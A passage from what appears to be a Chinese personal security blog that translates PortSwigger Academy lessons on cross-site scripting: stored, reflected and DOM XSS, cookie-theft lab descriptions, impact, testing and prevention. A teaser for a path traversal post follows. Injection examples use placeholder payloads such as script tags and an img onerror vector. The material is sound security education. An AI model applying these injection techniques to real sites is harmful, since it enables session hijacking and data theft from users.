可以在易受攻击的应用程序内部传递自带的攻击。</p><h3 id="利用跨站点脚本漏洞">利用跨站点脚本漏洞</h3><p>证明发现跨站脚本漏洞的传统方法是使用 alert() 函数创建一个弹出窗口。这并不是因为 XSS 与弹出窗口有什么关系；这只是一种证明您可以在给定域上执行任意 JavaScript 的方法。您可能会注意到有些人使用 alert(document.domain)。这是一种明确说明 JavaScript 在哪个域上执行的方法。</p><p>有时，你会想更进一步，通过提供一个完整的漏洞利用来证明 XSS 漏洞是一个真正的威胁。在本节中，我们将探讨三种最常用、最强大的 XSS 漏洞利用方法。</p><h4 id="利用跨站脚本窃取-cookie">利用跨站脚本窃取 cookie</h4><p>窃取 cookie 是一种利用 XSS 的传统方法。大多数网络应用程序都使用 cookie 进行会话处理。您可以利用跨站脚本漏洞，将受害者的 cookie 发送到自己的域，然后手动将 cookie 注入浏览器并假冒受害者。</p><p>实际上，这种方法有很大的局限性：</p><ul class="lvl-0"><li class="lvl-2"><p>受害者可能没有登录。</p></li><li class="lvl-2"><p>许多应用程序会使用 HttpOnly 标志对 JavaScript 隐藏 cookie。</p></li><li class="lvl-2"><p>会话可能被其他因素锁定，如用户的 IP 地址。</p></li><li class="lvl-2"><p>会话可能会在你劫持之前超时。</p></li></ul><h4 id="Lab：-利用跨站脚本窃取-cookie">Lab： 利用跨站脚本窃取 cookie</h4><p>本实验室包含博客评论功能中的存储 XSS 漏洞。模拟受害者用户会查看发布后的所有评论。要解决该实验问题，利用该漏洞渗出受害者的会话 cookie，然后使用该 cookie 冒充受害者。</p><h3 id="不同情况下的反射-XSS">不同情况下的反射 XSS</h3><h2 id="存储型XSS">存储型XSS</h2><p>当应用程序从不受信任的来源接收数据，并以不安全的方式将这些数据包含在随后的 HTTP 响应中时，就会产生存储 XSS（也称为持久或二阶 XSS）。</p><p>有关数据可能是通过 HTTP 请求提交给应用程序的；例如，博客文章上的评论、聊天室中的用户昵称或客户订单上的详细联系信息。在其他情况下，数据可能来自其他不受信任的来源；例如，显示通过 SMTP 收到的邮件的网络邮件应用程序、显示社交媒体帖子的营销应用程序或显示网络流量数据包的网络监控应用程序。</p><p>下面是一个存储 XSS 漏洞的简单示例。一个留言板应用程序允许用户提交信息，并显示给其他用户：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello, this is my message!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>应用程序不会对数据进行任何其他处理，因此攻击者可以轻松发送攻击其他用户的信息：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="comment">/* Bad stuff here... */</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="基于-DOM-的跨站点脚本">基于 DOM 的跨站点脚本</h2><p>基于 DOM 的 XSS（也称 DOM XSS）是指应用程序包含一些客户端 JavaScript，这些 JavaScript 以不安全的方式处理来自不信任源的数据，通常是将数据写回 DOM。</p><p>在下面的示例中，应用程序使用 JavaScript 从输入字段读取值，并将该值写入 HTML 中的一个元素：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> search = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;search&#x27;</span>).<span class="property">value</span>;</span><br><span class="line"><span class="keyword">var</span> results = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;results&#x27;</span>);</span><br><span class="line">results.<span class="property">innerHTML</span> = <span class="string">&#x27;You searched for: &#x27;</span> + search;</span><br></pre></td></tr></table></figure><p>如果攻击者可以控制输入字段的值，他们就可以轻松构建一个恶意值，从而执行自己的脚本：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">You</span> searched <span class="attr">for</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&#x27;/* Bad stuff here... */&#x27;</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>在典型的情况下，输入字段将由 HTTP 请求的一部分填充，如 URL 查询字符串参数，从而允许攻击者使用恶意 URL 进行攻击，其方式与反射 XSS 相同。</p><h2 id="XSS-可以用来做什么？">XSS 可以用来做什么？</h2><p>利用跨站脚本漏洞的攻击者通常能够：</p><ul class="lvl-0"><li class="lvl-2"><p>冒充或伪装成受害用户。</p></li><li class="lvl-2"><p>执行用户能够执行的任何操作。</p></li><li class="lvl-2"><p>读取用户能够访问的任何数据。</p></li><li class="lvl-2"><p>获取用户的登录凭证。</p></li><li class="lvl-2"><p>对网站进行虚拟篡改。</p></li><li class="lvl-2"><p>在网站中注入木马功能。</p></li></ul><h2 id="XSS-漏洞的影响">XSS 漏洞的影响</h2><p>XSS 攻击的实际影响通常取决于应用程序的性质、功能和数据，以及被攻击用户的状态。例如：</p><ul class="lvl-0"><li class="lvl-2"><p>在小册子软件应用程序中，所有用户都是匿名的，所有信息都是公开的，因此影响通常很小。</p></li><li class="lvl-2"><p>在持有敏感数据（如银行交易、电子邮件或医疗记录）的应用程序中，影响通常会很严重。</p></li><li class="lvl-2"><p>如果被入侵的用户在应用程序中拥有更高的权限，那么影响通常会非常严重，攻击者可以完全控制存在漏洞的应用程序，并入侵所有用户及其数据。</p></li></ul><h2 id="如何查找和测试-XSS-漏洞">如何查找和测试 XSS 漏洞</h2><p>绝大多数 XSS 漏洞都可以通过 Burp Suite 的网络漏洞扫描仪快速、可靠地发现。</p><p>手动测试反射和存储的 XSS 通常涉及向应用程序中的每个入口点提交一些简单的唯一输入（如一个简短的字母数字字符串），识别在 HTTP 响应中返回所提交输入的每个位置，并对每个位置进行单独测试，以确定适当制作的输入是否可用于执行任意 JavaScript。通过这种方法，您可以确定发生 XSS 的上下文，并选择合适的有效载荷加以利用。</p><p>手动测试由 URL 参数引起的基于 DOM 的 XSS 涉及类似的过程：在参数中放置一些简单的唯一输入，使用浏览器的开发工具在 DOM 中搜索该输入，并测试每个位置以确定其是否可被利用。然而，其他类型的 DOM XSS 更难检测。要在非基于 URL 的输入（如 document.cookie）或非基于 HTML 的汇（如 setTimeout）中发现基于 DOM 的漏洞，审查 JavaScript 代码是不可替代的，而审查 JavaScript 代码可能非常耗时。Burp Suite 的网络漏洞扫描器结合了 JavaScript 的静态和动态分析，能够可靠地自动检测基于 DOM 的漏洞。</p><h2 id="内容安全政策">内容安全政策</h2><p>内容安全策略（CSP）是一种浏览器机制，旨在减轻跨站脚本和其他一些漏洞的影响。如果采用 CSP 的应用程序包含类似 XSS 的行为，那么 CSP 可能会阻碍或阻止对漏洞的利用。通常情况下，CSP 可被规避，以便利用底层漏洞。</p><h2 id="悬挂标记注入">悬挂标记注入</h2><p>悬垂标记注入是一种技术，可用于在由于输入过滤器或其他防御措施而无法进行全面跨站脚本攻击的情况下跨域捕获数据。这种技术通常可用于捕获其他用户可见的敏感信息，包括可用于代表用户执行未授权操作的 CSRF 标记。</p><h2 id="如何防止-XSS-攻击">如何防止 XSS 攻击</h2><p>在某些情况下，防止跨站脚本是一件小事，但根据应用程序的复杂程度和处理用户可控数据的方式，防止跨站脚本可能要难得多。</p><p>一般来说，有效防止 XSS 漏洞可能需要结合以下措施：</p><ul class="lvl-0"><li class="lvl-2"><p>在输入到达时进行过滤。在接收用户输入时，尽可能严格地根据预期或有效输入进行过滤。</p></li><li class="lvl-2"><p>对输出数据进行编码。在 HTTP 响应中输出用户可控数据时，要对输出进行编码，防止其被解释为活动内容。根据输出上下文，这可能需要应用 HTML、URL、JavaScript 和 CSS 编码的组合。</p></li><li class="lvl-2"><p>使用适当的响应标头。为防止在不打算包含任何 HTML 或 JavaScript 的 HTTP 响应中出现 XSS，可以使用 <code>Content-Type</code> 和 <code>X-Content-Type-Options</code> 标头，确保浏览器按您的意图解释响应。</p></li><li class="lvl-2"><p>内容安全策略。作为最后一道防线，你可以使用内容安全策略（CSP）来降低仍然存在的任何 XSS 漏洞的严重性。</p></li></ul><p>对输出数据进行编码。在 HTTP 响应中输出用户可控数据时，要对输出进行编码，防止其被解释为活动内容。根据输出上下文，这可能需要应用 HTML、URL、JavaScript 和 CSS 编码的组合。</p><h2 id="有关跨站脚本的常见问题">有关跨站脚本的常见问题</h2><p>XSS 漏洞有多常见？XSS 漏洞非常常见，XSS 可能是最常出现的网络安全漏洞。</p><p>XSS 攻击有多常见？很难获得有关真实世界中 XSS 攻击的可靠数据，但它被利用的频率可能低于其他漏洞。</p><p>XSS 和 CSRF 有什么区别？XSS 涉及导致网站返回恶意 JavaScript，而 CSRF 涉及诱使受害用户执行他们无意执行的操作。</p><p>XSS 与 SQL 注入有何区别？XSS 是针对其他应用程序用户的客户端漏洞，而 SQL 注入是针对应用程序数据库的服务器端漏洞。</p><p>如何在 PHP 中防止 XSS？使用允许字符的白名单过滤输入，并使用类型提示或类型转换。在 HTML 上下文中使用 <code>htmlentities</code> 和 <code>ENT_QUOTES</code> 对输出进行转义，在 JavaScript 上下文中使用 JavaScript Unicode 转义。</p><p>如何在 Java 中防止 XSS？使用允许字符白名单过滤输入，使用 Google Guava 等库对 HTML 上下文的输出进行 HTML 编码，或使用 JavaScript Unicode 转义对 JavaScript 上下文进行转义。</p><p>本文参考：</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script></div><div></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.mcorazon.top/posts/15b3971d/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/006.png"><meta itemprop="name" content="Corazon"><meta itemprop="description" content="<font color="#000000">这世界总有黑夜<br>可我们总发着光</font>"> </span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="MCorazon"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/posts/15b3971d/" class="post-title-link" itemprop="url">【PortSwigger学院】路径遍历</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2025-04-30 12:59:05" itemprop="dateCreated datePublished" datetime="2025-04-30T12:59:05+08:00">2025-04-30</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2025-07-22 12:24:28" itemprop="dateModified" datetime="2025-07-22T12:24:28+08:00">2025-07-22</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">靶场练习</span></a> </span>， <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/PortSwigger%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">PortSwigger靶场</span></a></span></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>4.1k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>4 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><h2 id="什么是路径遍历">什么是路径遍历</h2><p>路径遍历也称为目录遍历。这些漏洞可使攻击者在运行应用程序的服务器上读取任意文件。这可能包括：</p><ul class="lvl-0"><li class="lvl-2"><p>应用程序代码和数据</p></li><li class="lvl-2"><p>后端系统的凭证</p></li><li class="lvl-2"><p>敏感的操作系统文件。</p></li></ul><p>在某些情况下，攻击者可能能够写入服务器上的任意文件，从而修改应用程序数据或行为，并最终完全控制服务器。</p><div class="post-button"><a class="btn" href="/posts/15b3971d/" rel="contents">阅读全文 &raquo;</a></div></div><div></div><footer class="post-footer"><div class="post-eof"></div></footer></article><nav class="pagination"><a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a></nav></div><script>window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }</script></div><div class="toggle sidebar-toggle"><span class="toggle-line toggle-line-first"></span> <span class="toggle-line toggle-line-middle"></span> <span class="toggle-line toggle-line-last"></span></div><aside class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc">文章目录</li><li class="sidebar-nav-overview">站点概览</li></ul><div class="post-toc-wrap sidebar-panel"></div><div class="site-overview-wrap sidebar-panel"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" alt="Corazon" src="/images/006.png"><p class="site-author-name" itemprop="name">Corazon</p><div class="site-description" itemprop="description"><font color="#000000">这世界总有黑夜<br>可我们总发着光</font></div></div><div class="site-state-wrap motion-element"><nav class="site-state"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">33</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/"><span class="site-state-item-count">16</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"><a href="/tags/"><span class="site-state-item-count">14</span> <span class="site-state-item-name">标签</span></a></div></nav></div><div class="links-of-author motion-element"><span class="links-of-author-item"><a href="https://github.com/Corazon-hacker" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Corazon-hacker" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a></span></div><div class="links-of-blogroll motion-element"><div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i> Links</div><ul class="links-of-blogroll-list"><li class="links-of-blogroll-item"><a href="https://www.runoob.com/" title="https:&#x2F;&#x2F;www.runoob.com&#x2F;" rel="noopener" target="_blank">菜鸟教程</a></li><li class="links-of-blogroll-item"><a href="http://c.biancheng.net/sitemap/" title="http:&#x2F;&#x2F;c.biancheng.net&#x2F;sitemap&#x2F;" rel="noopener" target="_blank">C语言中文网</a></li><li class="links-of-blogroll-item"><a href="https://csdiy.wiki/" title="https:&#x2F;&#x2F;csdiy.wiki&#x2F;" rel="noopener" target="_blank">CS自学指南</a></li><li class="links-of-blogroll-item"><a href="https://www.r2coding.com/#/" title="https:&#x2F;&#x2F;www.r2coding.com&#x2F;#&#x2F;" rel="noopener" target="_blank">Road To Coding</a></li><li class="links-of-blogroll-item"><a href="https://hackway.org/docs/cs/intro" title="https:&#x2F;&#x2F;hackway.org&#x2F;docs&#x2F;cs&#x2F;intro" rel="noopener" target="_blank">计算机专业学习路线</a></li></ul></div></div><div class="back-to-top motion-element"><i class="fa fa-arrow-up"></i> <span>0%</span></div><script type="text/javascript" charset="utf-8" src="/js/tagcloud.js"></script><script type="text/javascript" charset="utf-8" src="/js/tagcanvas.js"></script><div class="widget-wrap"><h3 class="widget-title">标签云</h3><div id="myCanvasContainer" class="widget tagcloud"><canvas width="250" height="250" id="resCanvas"><ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hexo/" rel="tag">Hexo</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/" rel="tag">Linux</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MYSQL/" rel="tag">MYSQL</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PortSwigger%E9%9D%B6%E5%9C%BA/" rel="tag">PortSwigger靶场</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Typora/" rel="tag">Typora</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/private/" rel="tag">private</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlmap/" rel="tag">sqlmap</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/upload-lab%E9%9D%B6%E5%9C%BA/" rel="tag">upload-lab靶场</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86/" rel="tag">路径遍历</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a><span class="tag-list-count">1</span></li></ul></canvas></div></div></div></aside><div id="sidebar-dimmer"></div></div></main></div><footer class="footer"><div class="footer-inner"><div class="copyright">&copy; <span itemprop="copyrightYear">2025</span> <span class="with-love"><i class="fa fa-heart"></i> </span><span class="author" itemprop="copyrightHolder">Corazon</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-chart-area"></i> </span><span title="站点总字数">260k</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-coffee"></i> </span><span title="站点阅读时长">3:57</span></div><div class="busuanzi-count"><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span class="post-meta-item" id="busuanzi_container_site_uv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-user"></i> </span><span class="site-uv" title="总访客量"><span id="busuanzi_value_site_uv"></span> </span></span><span class="post-meta-divider">|</span> <span class="post-meta-item" id="busuanzi_container_site_pv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-eye"></i> </span><span class="site-pv" title="总访问量"><span id="busuanzi_value_site_pv"></span></span></span></div></div></footer><script color="0,0,255" opacity="1" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script><script src="/lib/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script><script src="/lib/velocity/velocity.min.js"></script><script src="/lib/velocity/velocity.ui.min.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/pisces.js"></script><script src="/js/next-boot.js"></script><script src="/js/code-unfold.js"></script><script src="/js/local-search.js"></script><script>if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }</script><script>NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : true,
      appId      : '02iDSwDgb06k5K8yx5oSD85t-gzGzoHsz',
      appKey     : 'eA8vZdwW4UasH3SiNapGvXh5',
      placeholder: "你是我一生只会遇见一次的惊喜 ...",
      avatar     : 'monsterid',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : false,
      lang       : 'zh-cn' || 'zh-cn',
      path       : location.pathname,
      recordIP   : false,
      serverURLs : 'https://02idswdg.lc-cn-n1-shared.com'
    });
  }, window.Valine);
});</script><script>!function(){var t=document.createElement("script"),e=window.location.protocol.split(":")[0];t.src="https"===e?"https://zz.bdstatic.com/linksubmit/push.js":"http://push.zhanzhang.baidu.com/push.js";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(t,s)}()</script><link href="https://cdn.bootcss.com/gitalk/1.4.0/gitalk.min.css" rel="stylesheet"><script src="https://cdn.bootcss.com/gitalk/1.4.0/gitalk.min.js"></script><script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script><script type="text/javascript">var gitalk = new Gitalk({
    clientID: '',
    clientSecret: '',
    repo: 'Corazon-hacker.github.io',
    owner: '',
    admin: [''],
    id: md5(location.pathname),   // ISSUE：location.href 限制50个字符 (应该是Issue 内容存数据库的标识， 具体在页面上无感)
    labels: ''.split(',').filter(l => l),  // 需要的 labels需要一个数组，否则会报错
    perPage: ,
    pagerDirection: '',
    createIssueManually: ,
    distractionFreeMode: 
  })
  gitalk.render('gitalk-container')</script><style>[bg-lazy]{background-image:none!important;background-color:#eee!important}</style><script>window.imageLazyLoadSetting={isSPA:!1,preloadRatio:1,processImages:null}</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})})</script><script>(r=>{r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,o=r.imageLazyLoadSetting.preloadRatio||1,d=i();function i(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=i());for(var e,n=0;n<d.length;n++)0<=(e=(e=d[n]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*o||document.documentElement.clientHeight*o)&&(()=>{var t,e,a,o,i=d[n];e=function(){d=d.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,o=t.getAttribute("data-original"),a.onload=function(){t.src=o,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=o},t.src!==o&&(a.src=o)))})()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)})(this);</script></body></html>